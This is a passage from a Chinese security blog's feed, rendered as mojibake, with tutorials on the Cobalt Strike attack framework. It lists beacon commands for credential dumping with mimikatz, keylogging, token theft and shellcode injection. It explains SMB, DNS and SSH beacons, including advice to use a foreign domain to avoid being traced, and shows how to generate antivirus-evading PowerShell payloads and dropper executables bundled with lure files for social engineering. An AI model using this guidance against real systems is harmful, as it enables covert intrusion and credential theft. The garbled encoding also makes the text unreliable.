åå°„DLLæ³¨å…¥è¿›ç¨‹    dllload                   ä½¿ç”¨LoadLibraryå°†DLLåŠ è½½åˆ°è¿›ç¨‹ä¸­    download                  ä¸‹è½½æ–‡ä»¶    downloads                 åˆ—å‡ºæ­£åœ¨è¿›è¡Œçš„æ–‡ä»¶ä¸‹è½½    drives                    åˆ—å‡ºç›®æ ‡ç›˜ç¬¦    elevate                   å°è¯•ææƒ    execute                   åœ¨ç›®æ ‡ä¸Šæ‰§è¡Œç¨‹åº(æ— è¾“å‡º)    execute-assembly          åœ¨ç›®æ ‡ä¸Šå†…å­˜ä¸­æ‰§è¡Œæœ¬åœ°.NETç¨‹åº    exit                      é€€å‡ºbeacon    getprivs                  Enable system privileges on current token    getsystem                 å°è¯•è·å–SYSTEMæƒé™    getuid                    è·å–ç”¨æˆ·ID    hashdump                  è½¬å‚¨å¯†ç å“ˆå¸Œå€¼    help                      å¸®åŠ©    inject                    åœ¨ç‰¹å®šè¿›ç¨‹ä¸­ç”Ÿæˆä¼šè¯    jobkill                   æ€æ­»ä¸€ä¸ªåå°ä»»åŠ¡    jobs                      åˆ—å‡ºåå°ä»»åŠ¡    kerberos_ccache_use       ä»ccacheæ–‡ä»¶ä¸­å¯¼å…¥ç¥¨æ®åº”ç”¨äºæ­¤ä¼šè¯    kerberos_ticket_purge     æ¸…é™¤å½“å‰ä¼šè¯çš„ç¥¨æ®    kerberos_ticket_use       ä»ticketæ–‡ä»¶ä¸­å¯¼å…¥ç¥¨æ®åº”ç”¨äºæ­¤ä¼šè¯    keylogger                 é”®ç›˜è®°å½•    kill                      ç»“æŸè¿›ç¨‹    link                      Connect to a Beacon peer over a named pipe    logonpasswords            ä½¿ç”¨mimikatzè½¬å‚¨å‡­æ®å’Œå“ˆå¸Œå€¼    ls                        åˆ—å‡ºæ–‡ä»¶    make_token                åˆ›å»ºä»¤ç‰Œä»¥ä¼ é€’å‡­æ®    mimikatz                  è¿è¡Œmimikatz    mkdir                     åˆ›å»ºä¸€ä¸ªç›®å½•    mode dns                  ä½¿ç”¨DNS Aä½œä¸ºé€šä¿¡é€šé“(ä»…é™DNS beacon)    mode dns-txt              ä½¿ç”¨DNS TXTä½œä¸ºé€šä¿¡é€šé“(ä»…é™D beacon)    mode dns6                 ä½¿ç”¨DNS AAAAä½œä¸ºé€šä¿¡é€šé“(ä»…é™DNS beacon)    mode http                 ä½¿ç”¨HTTPä½œä¸ºé€šä¿¡é€šé“    mv                        ç§»åŠ¨æ–‡ä»¶    net                       netå‘½ä»¤    note                      å¤‡æ³¨           portscan                  è¿›è¡Œç«¯å£æ‰«æ    powerpick                 é€šè¿‡Unmanaged PowerShellæ‰§è¡Œå‘½ä»¤    powershell                é€šè¿‡powershell.exeæ‰§è¡Œå‘½ä»¤    powershell-import         å¯¼å…¥powershellè„šæœ¬    ppid                      Set parent PID for spawned post-ex jobs    ps                        æ˜¾ç¤ºè¿›ç¨‹åˆ—è¡¨    p**ec                    Use a service to spawn a session on a host    p**ec_psh                Use PowerShell to spawn a session on a host    psinject                  åœ¨ç‰¹å®šè¿›ç¨‹ä¸­æ‰§è¡ŒPowerShellå‘½ä»¤    pth                       ä½¿ç”¨Mimikatzè¿›è¡Œä¼ é€’å“ˆå¸Œ    pwd                       å½“å‰ç›®å½•ä½ç½®    reg                       Query the registry    rev2self                  æ¢å¤åŸå§‹ä»¤ç‰Œ    rm                        åˆ é™¤æ–‡ä»¶æˆ–æ–‡ä»¶å¤¹    rportfwd                  ç«¯å£è½¬å‘    run                       åœ¨ç›®æ ‡ä¸Šæ‰§è¡Œç¨‹åº(è¿”å›è¾“å‡º)    runas                     ä»¥å¦ä¸€ä¸ªç”¨æˆ·æƒé™æ‰§è¡Œç¨‹åº    runasadmin                åœ¨é«˜æƒé™ä¸‹æ‰§è¡Œç¨‹åº    runu                      Execute a program under another PID    screenshot                å±å¹•æˆªå›¾    setenv                    è®¾ç½®ç¯å¢ƒå˜é‡    shell                     cmdæ‰§è¡Œå‘½ä»¤    shinject                  å°†shellcodeæ³¨å…¥è¿›ç¨‹    shspawn                   ç”Ÿæˆè¿›ç¨‹å¹¶å°†shellcodeæ³¨å…¥å…¶ä¸­    sleep                     è®¾ç½®ç¡çœ å»¶è¿Ÿæ—¶é—´    socks                     å¯åŠ¨SOCKS4ä»£ç†    socks stop                åœæ­¢SOCKS4    spawn                     Spawn a session     spawnas                   Spawn a session as another user    spawnto                   Set executable to spawn processes into    spawnu                    Spawn a session under another PID    ssh                       ä½¿ç”¨sshè¿æ¥è¿œç¨‹ä¸»æœº    ssh-key                   ä½¿ç”¨å¯†é’¥è¿æ¥è¿œç¨‹ä¸»æœº    steal_token               ä»è¿›ç¨‹ä¸­çªƒå–ä»¤ç‰Œ    timestomp                 å°†ä¸€ä¸ªæ–‡ä»¶æ—¶é—´æˆ³åº”ç”¨åˆ°å¦ä¸€ä¸ªæ–‡ä»¶    unlink                    Disconnect from parent Beacon    upload                    ä¸Šä¼ æ–‡ä»¶    wdigest                   ä½¿ç”¨mimikatzè½¬å‚¨æ˜æ–‡å‡­æ®    winrm                     ä½¿ç”¨WinRMåœ¨ä¸»æœºä¸Šç”Ÿæˆä¼šè¯    wmi                       ä½¿ç”¨WMIåœ¨ä¸»æœºä¸Šç”Ÿæˆä¼šè¯    argue                      è¿›ç¨‹å‚æ•°æ¬ºéª—</code></pre><h3 id="2-å¤šç§beacon"><a href="#2-å¤šç§beacon" class="headerlink" title="2.å¤šç§beacon"></a>2.å¤šç§beacon</h3><p>ä»¥ä¸‹beaconä½¿ç”¨å‰å‡éœ€è¦å¼€å¯å¯¹åº”çš„Listenerï¼ŒListenerå¦‚ä½•å¼€å¯è¯·çœ‹ä¸Šä¸€èŠ‚</p><h3 id="â‘ http-beacon-amp-tcp-beacon"><a href="#â‘ http-beacon-amp-tcp-beacon" class="headerlink" title="â‘ http beacon&amp;tcp beacon"></a>â‘ http beacon&amp;tcp beacon</h3><p>è¿™ä¸¤ç§beaconéƒ½æ˜¯æ¯”è¾ƒæ™®é€šçš„ï¼Œä¸ªäººæ„Ÿè§‰è®²è§£çš„æ„ä¹‰ä¸æ˜¯å¾ˆå¤§ã€‚åªä¸è¿‡æ˜¯ä¸»æœºä¸teamserverçš„é€šä¿¡åè®®ä¸åŒè€Œå·²ã€‚<br><a href="%5Burl%5Dhttps://imgchr.com/i/eKZHTf%5B/url%5D"><img src="https://s2.ax1x.com/2019/07/27/eKZHTf.png" alt="eKZHTf.png"></a></p><h3 id="â‘¡SMB-beacon"><a href="#â‘¡SMB-beacon" class="headerlink" title="â‘¡SMB beacon"></a>â‘¡SMB beacon</h3><h4 id="1-ç®€ä»‹"><a href="#1-ç®€ä»‹" class="headerlink" title="1.ç®€ä»‹"></a>1.ç®€ä»‹</h4><p>å®˜ç½‘ä»‹ç»:SMB Beaconä½¿ç”¨å‘½åç®¡é“é€šè¿‡çˆ¶çº§Beaconè¿›è¡Œé€šè®¯ï¼Œå½“ä¸¤ä¸ªBeaconsé“¾æ¥åï¼Œå­Beaconä»çˆ¶Beaconè·å–åˆ°ä»»åŠ¡å¹¶å‘é€ã€‚<br>å› ä¸ºé“¾æ¥çš„Beaconsä½¿ç”¨Windowså‘½åç®¡é“è¿›è¡Œé€šä¿¡ï¼Œæ­¤æµé‡å°è£…åœ¨SMBåè®®ä¸­ï¼Œæ‰€ä»¥SMB Beaconç›¸å¯¹éšè”½ï¼Œç»•é˜²ç«å¢™æ—¶å¯èƒ½å‘æŒ¥å¥‡æ•ˆã€‚<br>è¿™å¼ å›¾å¾ˆå¥½çš„è¯ é‡Šäº†SMB beaconçš„å·¥ä½œæµç¨‹<br><a href="%5Burl%5Dhttps://imgchr.com/i/eKZLtS%5B/url%5D"><img src="https://s2.ax1x.com/2019/07/27/eKZLtS.png" alt="eKZLtS.png"></a></p><h4 id="â‘¡smb-beaconä½¿ç”¨"><a href="#â‘¡smb-beaconä½¿ç”¨" class="headerlink" title="â‘¡smb beaconä½¿ç”¨"></a>â‘¡smb beaconä½¿ç”¨</h4><p>â€»è¿™ç§beaconè¦æ±‚å…·æœ‰SMB Beaconçš„ä¸»æœºå¿…é¡»æ¥å—ç«¯å£445ä¸Šçš„è¿æ¥.<br>æ´¾ç”Ÿä¸€ä¸ªSMB Beaconæ–¹æ³•ï¼šåœ¨Listnerç”ŸæˆSMB Beacon&gt;ç›®æ ‡ä¸»æœº&gt;å³é”®&gt; spawn as&gt;é€‰ä¸­å¯¹åº”çš„Listener&gt;ä¸Šçº¿<br>æˆ–åœ¨beaconä¸­ä½¿ç”¨å‘½ä»¤spawn smbï¼ˆsmbä¸ºæˆ‘çš„smb listeneråå­—ï¼‰<br><a href="%5Burl%5Dhttps://imgchr.com/i/eKZjpQ%5B/url%5D"><img src="https://s2.ax1x.com/2019/07/27/eKZjpQ.png" alt="eKZjpQ.png"></a><br><a href="%5Burl%5Dhttps://imgchr.com/i/eKZvlj%5B/url%5D"><img src="https://s2.ax1x.com/2019/07/27/eKZvlj.png" alt="eKZvlj.png"></a></p><p>è¿è¡ŒæˆåŠŸåå¤–éƒ¨å¯ä»¥çœ‹åˆ°âˆâˆè¿™ä¸ªå­—ç¬¦ï¼Œè¿™å°±æ˜¯æ´¾ç”Ÿçš„SMB Beaconã€‚<br>å½“å‰æ˜¯è¿æ¥çŠ¶æ€ï¼Œä½ å¯ä»¥Beaconä¸Šç”¨link <ip>å‘½ä»¤é“¾æ¥ä»–æˆ–è€…unlink <ip>å‘½ä»¤æ–­å¼€å®ƒã€‚<br><a href="%5Burl%5Dhttps://imgchr.com/i/eKZx6s%5B/url%5D"><img src="https://s2.ax1x.com/2019/07/27/eKZx6s.png" alt="eKZx6s.png"></a></p><p>è¿™ç§beaconåœ¨å†…ç½‘æ¨ªå‘æ¸—é€ä¸­è¿ç”¨çš„å¾ˆå¤šï¼Œæ¨ªå‘æ¸—é€ç•™åˆ°æ—¥åå†è®²ã€‚åœ¨å†…ç½‘ç¯å¢ƒä¸­å¯ä»¥ä½¿ç”¨ipc $ç”Ÿæˆçš„SMB Beaconä¸Šä¼ åˆ°ç›®æ ‡ä¸»æœºæ‰§è¡Œï¼Œä½†æ˜¯ç›®æ ‡ä¸»æœºå¹¶ä¸ä¼šç›´æ¥ä¸Šçº¿çš„ï¼Œéœ€è¦æˆ‘ä»¬è‡ªå·±ç”¨é“¾æ¥å‘½ä»¤(link <ip>)å»è¿æ¥ä»–ã€‚ </p><h3 id="â‘¢DNS-Beacon"><a href="#â‘¢DNS-Beacon" class="headerlink" title="â‘¢DNS Beacon"></a>â‘¢DNS Beacon</h3><p>DNS Beacon åœ¨ç»•è¿‡é˜²ç«å¢™ æƒé™ç»´æŒä¸Šéå¸¸æœ‰æ•ˆï¼ŒDNS beacon å¯è°“æ˜¯æ˜¯æœ€å—æ¬¢è¿çš„Cobalt StrikeåŠŸèƒ½ä¹‹ä¸€ã€‚ å®˜ç½‘ç»™å‡ºçš„åŸç†ç¤ºæ„å›¾å¦‚ä¸‹<br><a href="%5Burl%5Dhttps://imgchr.com/i/eKZ70P%5B/url%5D"><img src="https://s2.ax1x.com/2019/07/27/eKZ70P.png" alt="eKZ70P.png"></a><br>ä½¿ç”¨DNS Beaconé¦–å…ˆçš„æœ‰ä¸€ä¸ªåŸŸåï¼ŒåŸŸåå»ºè®®ç”¨å›½å¤–çš„ï¼Œçœå»ä¸€äº›ä¸å¿…è¦çš„éº»çƒ¦ï¼Œä¹Ÿé˜²æ­¢è¢«æŸ¥æ°´è¡¨ã€‚ã€‚ã€‚åŸŸåä½¿ç”¨ä¸€äº›é€šç”¨å¹³å¸¸çš„å³å¯ï¼Œæ•´ä¸ªé…ç½®è¿‡ç¨‹é…ç½®éå¸¸ç®€å•ä¸€æ¡Aè®°å½•å’Œå‡ æ¡NSè®°å½•å³å¯</p><p>é¦–å…ˆè¿›å…¥åˆ°åŸŸåç®¡ç†ç•Œé¢ï¼ˆè‡ªå·±çš„åŸŸåè¿‡æœŸäº†ï¼Œç”¨ä¸€ä¸‹404å¸ˆå‚…çš„å›¾ï¼‰<br>é…ç½®Aè®°å½•æŒ‡å‘æœåŠ¡å™¨ip â€“&gt;nsè®°å½•éƒ½æŒ‡å‘Aè®°å½•åŸŸå<br><a href="%5Burl%5Dhttps://imgchr.com/i/eKZ56A%5B/url%5D"><img src="https://s2.ax1x.com/2019/07/27/eKZ56A.png" alt="eKZ56A.png"></a></p><p>é…ç½®å¥½äº†æˆ‘ä»¬å¯ä»¥ç”¨ nslookup æˆ–è€… dig +trace æ¥æµ‹è¯•ä¸‹ æ˜¯å¦æˆåŠŸ<br><a href="%5Burl%5Dhttps://imgchr.com/i/eKZ4ld%5B/url%5D"><img src="https://s2.ax1x.com/2019/07/27/eKZ4ld.png" alt="eKZ4ld.png"></a><br>å¦‚æœè¿”å›çš„IPåœ°å€ä¸ä½ çš„æœåŠ¡å™¨ipåœ°å€å¯¹åº”æ˜¯æ­£ç¡®çš„ï¼Œé‚£æˆ‘ä»¬å°±å¯ä»¥å¼€å§‹é…ç½®dns beaconçš„ç›‘å¬å™¨äº†<br><a href="%5Burl%5Dhttps://imgchr.com/i/eKuqDs%5B/url%5D"><img src="https://s2.ax1x.com/2019/07/27/eKuqDs.png" alt="eKuqDs.png"></a></p><p>Hosté‚£é‡Œæœ€å¥½å¡«åŸŸåï¼ˆAè®°å½•è§£æé‚£ä¸ªï¼‰ï¼Œä¸è¦å¡«æœåŠ¡å™¨çš„ipåœ°å€<br><a href="%5Burl%5Dhttps://imgchr.com/i/eKZhSH%5B/url%5D"><img src="https://s2.ax1x.com/2019/07/27/eKZhSH.png" alt="eKZhSH.png"></a><br>ç„¶åç¡®å®šå¡«ä¸Šnsè®°å½• è‹±æ–‡é€—å·éš”å¼€ ï¼Œç„¶åç”Ÿæˆåé—¨æµ‹è¯•æ•ˆæœ<br><a href="%5Burl%5Dhttps://imgchr.com/i/eKubuj%5B/url%5D"><img src="https://s2.ax1x.com/2019/07/27/eKubuj.png" alt="eKubuj.png"></a><br>è¿™æ˜¯ä¸»æœºæ ä¸Šå‡ºç°äº†ä¸€ä¸ªé»‘å±çš„logoï¼Œç»è¿‡ä¸€æ®µæ—¶é—´çš„ç­‰å¾…ï¼Œç›®æ ‡ä¸»æœºå³å¯ä¸Šçº¿ã€‚</p><h3 id="â‘£SSH-beacon"><a href="#â‘£SSH-beacon" class="headerlink" title="â‘£SSH beacon"></a>â‘£SSH beacon</h3><p>å½“å†…ç½‘æœ‰Linuxæ—¶Cobalt Strikeä¹Ÿæ˜¯è€ƒè™‘åˆ°çš„æä¾›äº†sshè¿æ¥ï¼Œå¤§å®¶å¯ä»¥é€šè¿‡metasploitçˆ†ç ´å†…ç½‘çš„sshè´¦å·å¯†ç ï¼Œç„¶åç”¨ç›®æ ‡æœºçš„beaconå»è¿æ¥å°±å¯ä»¥äº†ã€‚<br>ç›®å‰æœ‰ä¸¤ç§SSH Beaconè¿æ¥æ–¹æ³•<br><strong>1.å¯†ç ç›´æ¥è¿æ¥</strong><br>Beaconå‘½ä»¤: ssh [target:port] [user] [pass]<br><strong>2.sshå¯†åŒ™è¿æ¥</strong><br>ssh [target:port] [user] [&#x2F;path&#x2F;to&#x2F;key.pem]<br>é“¾æ¥æˆåŠŸåï¼Œå¦‚å›¾ä¼šå‡ºç°ä¸€ä¸ªå­beacon<br><a href="%5Burl%5Dhttps://imgchr.com/i/eKZIOI%5B/url%5D"><img src="https://s2.ax1x.com/2019/07/27/eKZIOI.png" alt="eKZIOI.png"></a></p>]]></content>
      
      
      <categories>
          
          <category> å®‰å…¨å·¥å…· </category>
          
      </categories>
      
      
        <tags>
            
            <tag> å®‰å…¨å·¥å…· </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Cobaltstrikeç³»åˆ—æ•™ç¨‹(äºŒ)Listnerä¸Payloadç”Ÿæˆ</title>
      <link href="/2019/06/08/Cobaltstrike%E7%B3%BB%E5%88%97%E6%95%99%E7%A8%8B-%E4%BA%8C-Listner%E4%B8%8EPayload%E7%94%9F%E6%88%90/"/>
      <url>/2019/06/08/Cobaltstrike%E7%B3%BB%E5%88%97%E6%95%99%E7%A8%8B-%E4%BA%8C-Listner%E4%B8%8EPayload%E7%94%9F%E6%88%90/</url>
      
        <content type="html"><![CDATA[<h2 id="0x00-å‰è¨€"><a href="#0x00-å‰è¨€" class="headerlink" title="0x00-å‰è¨€"></a>0x00-å‰è¨€</h2><p>PS:åŸæœ¬æƒ³å®Œæˆæ—¥æ›´ç›®æ ‡çš„ï¼Œä½†æ˜¨å¤©åœ¨ç ”ç©¶æ— çº¿ï¼Œå°±æ²¡æ›´ï¼Œä»Šå¤©åŠ ç­~<br><img src="https://s2.ax1x.com/2019/07/27/euTJyt.png" alt="euTJyt.png"></p><h2 id="0x01-Listner-ç›‘å¬å™¨-ä»‹ç»"><a href="#0x01-Listner-ç›‘å¬å™¨-ä»‹ç»" class="headerlink" title="0x01-Listner(ç›‘å¬å™¨)ä»‹ç»"></a>0x01-Listner(ç›‘å¬å™¨)ä»‹ç»</h2><h3 id="â‘ Cobaltstrike-listnerç®€ä»‹"><a href="#â‘ Cobaltstrike-listnerç®€ä»‹" class="headerlink" title="â‘ Cobaltstrike listnerç®€ä»‹"></a>â‘ Cobaltstrike listnerç®€ä»‹</h3><p>å¯èƒ½æœ‰ä¸€äº›å°ç™½å¹¶ä¸ç†è§£ä»€ä¹ˆå«åšlistnerï¼Œåœ¨æ­¤ç§‘æ™®ä¸€ä¸‹ã€‚<br>Listner(ç›‘å¬å™¨):ä¸“é—¨ç”¨äºå¯¹å…¶ä»–å¯¹è±¡èº«ä¸Šå‘ç”Ÿçš„äº‹ä»¶æˆ–çŠ¶æ€æ”¹å˜è¿›è¡Œç›‘å¬å’Œç›¸åº”å¤„ç†çš„å¯¹è±¡,å½“è¢«ç›‘è§†çš„å¯¹è±¡å‘ç”Ÿæƒ…å†µæ—¶,ç«‹å³é‡‡å–ç›¸åº”çš„è¡ŒåŠ¨ã€‚<br>åœ¨è®¸å¤šçš„æ¸—é€æµ‹è¯•å·¥å…·ä¸­ï¼Œä¾‹å¦‚empireï¼Œmetasploitï¼Œcobaltstrikeä¸­éƒ½æœ‰listnerçš„å­˜åœ¨ã€‚å¤§å®¶å¯ä»¥ç®€å•åœ°ç†è§£ä¸ºlistnerå°±æ˜¯ç”¨æ¥æ¥æ”¶ç›®æ ‡ä¸»æœºæƒé™çš„æ¨¡å—ã€‚<br><img src="https://img2020.cnblogs.com/blog/1771833/202112/1771833-20211220201742456-2098877481.png" alt="image"></p><p>åˆ›å»ºListenerçš„æ­¥éª¤ï¼šCobaltstrikeâ€“&gt;ç›‘å¬å™¨<br>ç›®å‰æˆ‘æ˜¯ç”¨çš„æ˜¯Cobaltstrike3.13ç‰ˆæœ¬ï¼Œå…¶ä¸­å†…ç½®äº†ä¹ä¸ªListener<br><a href="https://imgchr.com/i/euT8SA"><img src="https://s2.ax1x.com/2019/07/27/euT8SA.png" alt="euT8SA.png"></a></p><pre><code>windows/beacon_dns/reverse_dns_txtwindows/beacon_dns/reverse_httpwindows/beacon_tcp/bind_tcpwindows/beacon_http/reverse_httpwindows/beacon_https/reverse_httpswindows/beacon_smb/bind_pipe windows/foreign/reverse_http windows/foreign/reverse_https windows/foreign/reverse_tcp</code></pre><p>beaconä¸ºcså†…ç½®ç›‘å¬å™¨,ä¹Ÿå°±æ˜¯è¯´,å½“æˆ‘ä»¬åœ¨ç›®æ ‡ç³»ç»ŸæˆåŠŸæ‰§è¡Œpayloadä»¥å,ä¼šå¼¹å›ä¸€ä¸ªbeaconçš„shellç»™cs<br>foreignä¸»è¦æ˜¯æä¾›ç»™å¤–éƒ¨ä½¿ç”¨çš„ä¸€äº›ç›‘å¬å™¨,æ¯”å¦‚ä½ æƒ³åˆ©ç”¨csæ´¾ç”Ÿä¸€ä¸ªmeterpreteræˆ–è€…armitageçš„shellå›æ¥,æ¥ç»§ç»­åé¢çš„å†…ç½‘æ¸—é€,è¿™æ—¶å°±é€‰æ‹©ä½¿ç”¨å¤–éƒ¨ç›‘å¬å™¨<br>è‡³äºå¦‚ä½•å®ç°Cobaltstrikeä¸MSFå’ŒArmitageçš„è”åŠ¨ï¼Œæˆ‘ä»¬æ—¥åå†è®²ã€‚</p><h3 id="â‘¡listenerçš„é…ç½®"><a href="#â‘¡listenerçš„é…ç½®" class="headerlink" title="â‘¡listenerçš„é…ç½®"></a>â‘¡listenerçš„é…ç½®</h3><p>é€‰æ‹©Cobaltstrikeâ€“&gt;ç›‘å¬å™¨<br>éšåè¾“å…¥Listeneråå­—å¹¶é€‰æ‹©ä½ è¦ä½¿ç”¨çš„Listnerç±»å‹ï¼Œé…ç½®å¥½å¤–ç½‘IPå’Œç«¯å£(ä¸èƒ½å†²çª)ç‚¹å‡»saveå³å¯ä¿å­˜ã€‚åœ¨ä»¥åç”ŸæˆPayloadçš„è¿‡ç¨‹ä¸­å³å¯ä½¿ç”¨è¯¥ç›‘å¬å™¨ã€‚<br><a href="https://imgchr.com/i/euTZsx"><img src="https://s2.ax1x.com/2019/07/27/euTZsx.png" alt="euTZsx.png"></a></p><h2 id="0x002-Cobaltstrikeç”Ÿæˆåé—¨"><a href="#0x002-Cobaltstrikeç”Ÿæˆåé—¨" class="headerlink" title="0x002-Cobaltstrikeç”Ÿæˆåé—¨"></a>0x002-Cobaltstrikeç”Ÿæˆåé—¨</h2><h3 id="â‘ Payloadæ¦‚å¿µ"><a href="#â‘ Payloadæ¦‚å¿µ" class="headerlink" title="â‘ Payloadæ¦‚å¿µ"></a>â‘ Payloadæ¦‚å¿µ</h3><p>Payloadåœ¨æ¸—é€æµ‹è¯•ä¹‹ä¸­å¤§å®¶å¯ä»¥ç®€å•åœ°ç†è§£ä¸ºä¸€æ®µæ¼æ´åˆ©ç”¨&#x2F;æ¤å…¥åé—¨çš„ä»£ç æˆ–ç¨‹åºã€‚</p><h3 id="â‘¡Cobaltstrikeç”Ÿæˆåé—¨"><a href="#â‘¡Cobaltstrikeç”Ÿæˆåé—¨" class="headerlink" title="â‘¡Cobaltstrikeç”Ÿæˆåé—¨"></a>â‘¡Cobaltstrikeç”Ÿæˆåé—¨</h3><p>æ”»å‡»â€“&gt;ç”Ÿæˆåé—¨<br><a href="https://imgchr.com/i/euTGQI"><img src="https://s2.ax1x.com/2019/07/27/euTGQI.png" alt="euTGQI.png"></a><br>ä»Šå¤©æˆ‘ä»¬æ¥è®²çº¢æ¡†ä¸­çš„å››ä¸ªç”Ÿæˆåé—¨çš„æ–¹å¼ï¼Œå…¶ä½™çš„æ¯”è¾ƒç‰¹æ®Šï¼Œç•™ä½œæ—¥åå•ç‹¬è®²è§£ã€‚</p><h3 id="1-Payload-Generator"><a href="#1-Payload-Generator" class="headerlink" title="1.Payload Generator"></a>1.Payload Generator</h3><p>è¯¥æ¨¡å—å¯ä»¥ç”Ÿæˆnä¸­è¯­è¨€çš„åé—¨Payloadï¼ŒåŒ…æ‹¬C,C#,Python,Java,Perl,Powershellè„šæœ¬ï¼ŒPowershellå‘½ä»¤ï¼ŒRuby,Rawï¼Œå…æ€æ¡†æ¶Veliä¸­çš„shellcodeç­‰ç­‰â€¦ä¸ªäººæ„Ÿè§‰è¿™æ˜¯CSçš„ä¸€ä¸ªå¾ˆå¤§çš„è¿·äººä¹‹å¤„ã€‚<br><a href="https://imgchr.com/i/euTVQ1"><img src="https://s2.ax1x.com/2019/07/27/euTVQ1.png" alt="euTVQ1.png"></a><br>åœ¨æ¸—é€Windowsä¸»æœºè¿‡ç¨‹ä¸­ï¼Œæˆ‘ç”¨çš„æ¯”è¾ƒå¤šçš„å°±æ˜¯Powershellå’ŒPowershell Commandï¼Œä¸»è¦æ˜¯å› ä¸ºå…¶æ–¹ä¾¿æ˜“ç”¨ï¼Œä¸”å¯ä»¥é€ƒé¿ä¸€ä¸‹æ€æ¯’è½¯ä»¶ï¼ˆAVï¼‰çš„æŸ¥æ€ã€‚<br>ä»¥Powershell Commandä¸ºä¾‹ï¼Œç”Ÿæˆçš„payloadä¸ºä¸€ä¸²å‘½ä»¤ï¼Œåªè¦åœ¨ä¸»æœºä¸Šæ‰§è¡Œè¿™ä¸€ä¸²å‘½ä»¤ï¼ˆä¸»æœºéœ€å®‰è£…Powershellï¼‰ï¼Œcså³å¯æ”¶åˆ°ä¸»æœºçš„beacon<br><a href="https://imgchr.com/i/euTudO"><img src="https://s2.ax1x.com/2019/07/27/euTudO.png" alt="euTudO.png"></a><br>å…¶ä»–è¯­è¨€çš„Payloadï¼Œå¤§å®¶è¯·è‡ªå·±ç ”ç©¶~</p><h3 id="2-Windows-Dropper"><a href="#2-Windows-Dropper" class="headerlink" title="2.Windows Dropper"></a>2.Windows Dropper</h3><p>è¿™ä¸ªæ˜¯ä¸€ä¸ªwindowsç¨‹åºçš„æ†ç»‘å™¨ï¼Œä»–å¯ä»¥å®ç°æŠŠåé—¨æ†ç»‘äºå…¶ä»–ç¨‹åºä¹‹ä¸Šï¼Œæ¯”å¦‚æ‰«é›·æ¸¸æˆï¼ŒæŸäº›å¸¦æœ‰è¯±æƒ‘æ€§çš„å¯æ‰§è¡Œæ–‡ä»¶â€¦<br>ä¸ªäººæ„Ÿè§‰è¿™ç§æ”»å‡»æ–¹å¼ç»“åˆç¤¾å·¥æ¥ä¸€åŒåº”ç”¨å¾€å¾€ä¼šå‘æŒ¥å¥‡æ•ˆ~<br><a href="https://imgchr.com/i/euTneK"><img src="https://s2.ax1x.com/2019/07/27/euTneK.png" alt="euTneK.png"></a><br>åœ¨æœ¬å¤„ï¼Œæˆ‘æ†ç»‘çš„æ–‡ä»¶ä¸ºnidongde.txtï¼Œç”Ÿæˆçš„åé—¨åä¸ºdropper.exe<br>ç‚¹å‡»dropper.exeæ‰§è¡Œåï¼Œé‡Šæ”¾å‡ºäº†nidongde.txtæ–‡ä»¶ï¼ŒåŒæ—¶CSä¹Ÿæ”¶åˆ°äº†ä¼šè¯ã€‚<br><img src="https://s2.ax1x.com/2019/07/27/euTBWj.png" alt="euTBWj.png"></p><h3 id="3-Windows-Excutable-x2F-Windows-Excutable-s"><a href="#3-Windows-Excutable-x2F-Windows-Excutable-s" class="headerlink" title="3.Windows Excutable&#x2F;Windows Excutable(s)"></a>3.Windows Excutable&#x2F;Windows Excutable(s)</h3><h4 id="â‘ Windows-Excutableç”Ÿæˆçš„åé—¨æ˜¯Windowså¯æ‰§è¡Œæ–‡ä»¶ï¼Œå¦‚exeï¼ŒDLL"><a href="#â‘ Windows-Excutableç”Ÿæˆçš„åé—¨æ˜¯Windowså¯æ‰§è¡Œæ–‡ä»¶ï¼Œå¦‚exeï¼ŒDLL" class="headerlink" title="â‘ Windows Excutableç”Ÿæˆçš„åé—¨æ˜¯Windowså¯æ‰§è¡Œæ–‡ä»¶ï¼Œå¦‚exeï¼ŒDLL"></a>â‘ Windows Excutableç”Ÿæˆçš„åé—¨æ˜¯Windowså¯æ‰§è¡Œæ–‡ä»¶ï¼Œå¦‚exeï¼ŒDLL</h4><p><a href="https://imgchr.com/i/euTKoD"><img src="https://s2.ax1x.com/2019/07/27/euTKoD.png" alt="euTKoD.png"></a><br>exeæ–‡ä»¶è¿è¡Œåï¼ŒCSå³å¯æ”¶åˆ°ç›®æ ‡ä¸»æœºçš„ä¼šè¯ã€‚<br>è‡³äºDLLå¤§å®¶å¯ä»¥ä½¿ç”¨é’ˆå¯¹DLLçš„ç›¸å…³æ”»å‡»æ‰‹æ³•ï¼Œè¿™ä¸ªæˆ‘æ—¥åä¼šå†™æ–‡ç« ä¸“é—¨æ¥è®²</p><h4 id="â‘¡Windows-Excutableå¸¦æœ‰ç”Ÿæˆå‡ºçš„æ˜¯stagelessç‰ˆæœ¬ï¼ˆæ— çŠ¶æ€Windowsåé—¨æœ¨é©¬ï¼‰ï¼Œä¸‹é¢ç®€å•è¯´ä¸‹è¿™ä¸ªæ— çŠ¶æ€æœ¨é©¬çš„ä½¿ç”¨æ–¹æ³•ã€‚ä¸€èˆ¬ä½¿ç”¨æ— çŠ¶æ€æœ¨é©¬çš„ç½‘ç»œç¯å¢ƒæ˜¯è¿™æ ·çš„"><a href="#â‘¡Windows-Excutableå¸¦æœ‰ç”Ÿæˆå‡ºçš„æ˜¯stagelessç‰ˆæœ¬ï¼ˆæ— çŠ¶æ€Windowsåé—¨æœ¨é©¬ï¼‰ï¼Œä¸‹é¢ç®€å•è¯´ä¸‹è¿™ä¸ªæ— çŠ¶æ€æœ¨é©¬çš„ä½¿ç”¨æ–¹æ³•ã€‚ä¸€èˆ¬ä½¿ç”¨æ— çŠ¶æ€æœ¨é©¬çš„ç½‘ç»œç¯å¢ƒæ˜¯è¿™æ ·çš„" class="headerlink" title="â‘¡Windows Excutableå¸¦æœ‰ç”Ÿæˆå‡ºçš„æ˜¯stagelessç‰ˆæœ¬ï¼ˆæ— çŠ¶æ€Windowsåé—¨æœ¨é©¬ï¼‰ï¼Œä¸‹é¢ç®€å•è¯´ä¸‹è¿™ä¸ªæ— çŠ¶æ€æœ¨é©¬çš„ä½¿ç”¨æ–¹æ³•ã€‚ä¸€èˆ¬ä½¿ç”¨æ— çŠ¶æ€æœ¨é©¬çš„ç½‘ç»œç¯å¢ƒæ˜¯è¿™æ ·çš„"></a>â‘¡Windows Excutableå¸¦æœ‰ç”Ÿæˆå‡ºçš„æ˜¯stagelessç‰ˆæœ¬ï¼ˆæ— çŠ¶æ€Windowsåé—¨æœ¨é©¬ï¼‰ï¼Œä¸‹é¢ç®€å•è¯´ä¸‹è¿™ä¸ªæ— 